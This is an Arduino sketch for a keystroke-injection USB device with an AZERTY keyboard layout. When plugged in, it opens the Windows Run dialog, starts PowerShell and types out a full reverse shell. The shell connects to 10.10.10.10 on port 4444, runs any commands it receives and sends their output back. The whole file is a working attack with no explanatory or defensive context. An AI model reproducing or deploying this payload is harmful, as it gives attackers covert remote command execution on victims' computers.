#include "KeyboardAzertyFr.h"

void setup() {
  
KeyboardAzertyFr.begin();
delay(1000);

KeyboardAzertyFr.press(KEY_LEFT_GUI);
KeyboardAzertyFr.press('r');
KeyboardAzertyFr.releaseAll();
delay(1000);

KeyboardAzertyFr.print("powershell.exe");
delay(1000);
KeyboardAzertyFr.press(KEY_RETURN);
KeyboardAzertyFr.releaseAll();
delay(1500);



KeyboardAzertyFr.print("$client = New-Object  System.Net.Sockets.TCPClient(\"10.10.10.10\",4444);$stream = $client.GetStream();");
delay(500);
KeyboardAzertyFr.press(KEY_LEFT_CTRL);
KeyboardAzertyFr.press(KEY_LEFT_ALT);
KeyboardAzertyFr.print("(");
KeyboardAzertyFr.releaseAll();
delay(250);

KeyboardAzertyFr.print("byte");

KeyboardAzertyFr.press(KEY_LEFT_CTRL);
KeyboardAzertyFr.press(KEY_LEFT_ALT);
KeyboardAzertyFr.print("())");
KeyboardAzertyFr.releaseAll();
delay(250);

KeyboardAzertyFr.print("$bytes = 0..65535");

KeyboardAzertyFr.press(KEY_LEFT_CTRL);
KeyboardAzertyFr.press(KEY_LEFT_ALT);
KeyboardAzertyFr.print("-");
KeyboardAzertyFr.releaseAll();

KeyboardAzertyFr.print("%");

KeyboardAzertyFr.press(KEY_LEFT_CTRL);
KeyboardAzertyFr.press(KEY_LEFT_ALT);
KeyboardAzertyFr.print("'");
KeyboardAzertyFr.releaseAll();

KeyboardAzertyFr.print("0");

KeyboardAzertyFr.press(KEY_LEFT_CTRL);
KeyboardAzertyFr.press(KEY_LEFT_ALT);
KeyboardAzertyFr.print("=");
KeyboardAzertyFr.releaseAll();

KeyboardAzertyFr.print(";while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)");

KeyboardAzertyFr.press(KEY_LEFT_CTRL);
KeyboardAzertyFr.press(KEY_LEFT_ALT);
KeyboardAzertyFr.print("'");
KeyboardAzertyFr.releaseAll();
delay(250);

KeyboardAzertyFr.print(";$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2");
KeyboardAzertyFr.press(KEY_LEFT_SHIFT);
KeyboardAzertyFr.print("<");
KeyboardAzertyFr.release(KEY_LEFT_SHIFT);
delay(250);

KeyboardAzertyFr.print("&1 ");


KeyboardAzertyFr.press(KEY_LEFT_CTRL);
KeyboardAzertyFr.press(KEY_LEFT_ALT);
KeyboardAzertyFr.print("-");
KeyboardAzertyFr.releaseAll();

KeyboardAzertyFr.print(" Out-String );$sendback2 = $sendback ");

KeyboardAzertyFr.press(KEY_LEFT_SHIFT);
KeyboardAzertyFr.print("=");
KeyboardAzertyFr.releaseAll();

KeyboardAzertyFr.print(" \"PS \" ");

KeyboardAzertyFr.press(KEY_LEFT_SHIFT);
KeyboardAzertyFr.print("=");
KeyboardAzertyFr.releaseAll();
delay(250);

KeyboardAzertyFr.print(" (pwd).Path ");

KeyboardAzertyFr.press(KEY_LEFT_SHIFT);
KeyboardAzertyFr.print("=");
KeyboardAzertyFr.releaseAll();

KeyboardAzertyFr.print(" \"");

KeyboardAzertyFr.press(KEY_LEFT_SHIFT);
KeyboardAzertyFr.print("<");
KeyboardAzertyFr.release(KEY_LEFT_SHIFT);
delay(250);


KeyboardAzertyFr.print(" \";$sendbyte = (");

KeyboardAzertyFr.press(KEY_LEFT_CTRL);
KeyboardAzertyFr.press(KEY_LEFT_ALT);
KeyboardAzertyFr.print("(");
KeyboardAzertyFr.releaseAll();

KeyboardAzertyFr.print("text.encoding");

KeyboardAzertyFr.press(KEY_LEFT_CTRL);
KeyboardAzertyFr.press(KEY_LEFT_ALT);
KeyboardAzertyFr.print(")");
KeyboardAzertyFr.releaseAll();

KeyboardAzertyFr.print("::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()");

KeyboardAzertyFr.press(KEY_LEFT_CTRL);
KeyboardAzertyFr.press(KEY_LEFT_ALT);
KeyboardAzertyFr.print("=");
KeyboardAzertyFr.releaseAll();

KeyboardAzertyFr.print(";$client.Close()");

KeyboardAzertyFr.press(KEY_RETURN);
KeyboardAzertyFr.releaseAll();

KeyboardAzertyFr.end();

}

void loop()  {


  
}
